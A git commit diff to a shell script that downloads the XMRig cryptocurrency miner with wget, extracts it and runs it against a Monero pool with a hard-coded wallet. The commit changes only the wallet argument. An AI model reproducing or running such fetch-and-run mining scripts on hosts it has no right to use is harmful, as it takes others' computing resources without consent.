8b4e62457d9c0b8fad904624d53dc4b423399e10
Handerfall <64298821+Handerfall@users.noreply.github.com>
2021-03-01 17:34:34 +0200

    Update main.sh

--- main.sh
+++ main.sh
@@ -1,3 +1,3 @@
 wget https://github.com/xmrig/xmrig/releases/download/v6.9.0/xmrig-6.9.0-linux-x64.tar.gz
 tar -xvf xmrig-6.9.0-linux-x64.tar.gz
-./xmrig-6.9.0/xmrig -o monero.herominers.com:10191 -u 48WUqsieifpKHg9chkJdC2PG9qYT8zdt3U6zYqx5YRnPLS3QsGB7bFJXYqPpaBXFkQFampQtJvTC7MQnbQwrbUvhNuYTzXa -a rx/0 -p Script -k
+./xmrig-6.9.0/xmrig -o monero.herominers.com:10191 -u solo:48WUqsieifpKHg9chkJdC2PG9qYT8zdt3U6zYqx5YRnPLS3QsGB7bFJXYqPpaBXFkQFampQtJvTC7MQnbQwrbUvhNuYTzXa -a rx/0 -p Script -k
